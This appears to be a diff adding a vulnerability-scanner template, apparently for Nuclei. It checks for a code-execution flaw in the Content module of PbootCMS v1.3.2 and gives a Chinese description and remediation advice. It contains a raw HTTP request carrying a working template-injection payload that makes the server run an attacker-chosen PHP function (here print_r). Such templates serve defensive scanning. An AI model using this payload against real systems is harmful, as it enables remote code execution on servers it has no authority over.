@@ -1,0 +1,29 @@
+id: PbootCMS_v1-Content-CommandExecution
+info:
+  name: PbootCMS v1.3.2 Content模块代码执行
+  author:
+  - jim2g
+  description: |
+    PbootCMS v1.3.2 Content模块代码执行
+    当应用程序在调用一些能将字符串转化成代码的函数（如php中的eval）时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。
+    代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞（也称代码执行）。
+  severity: critical
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+
+    临时修复方案：
+    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
+    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,"c")
+  raw:
+  - |
+    GET /index.php/index/index?keyword=](http://127.0.0.1/PbootCMS/index.php/Content/2?keyword=){pboot:if(1)$a=$_GET[b];$a(c);;//)})}}{/pboot:if}&b=print_r HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
